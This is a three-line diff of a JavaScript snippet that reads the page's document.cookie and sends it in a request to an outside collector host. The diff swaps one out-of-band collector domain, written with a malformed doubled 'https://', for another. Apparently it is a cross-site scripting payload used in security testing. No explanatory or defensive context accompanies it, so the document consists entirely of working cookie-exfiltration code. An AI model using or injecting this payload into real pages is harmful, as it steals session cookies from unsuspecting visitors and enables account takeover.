@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://https://222u2hcaqj01c2oure116zex0o6fu5iu.oastify.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://c0d40rakotybacm4pozb49c7yy4psgg5.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
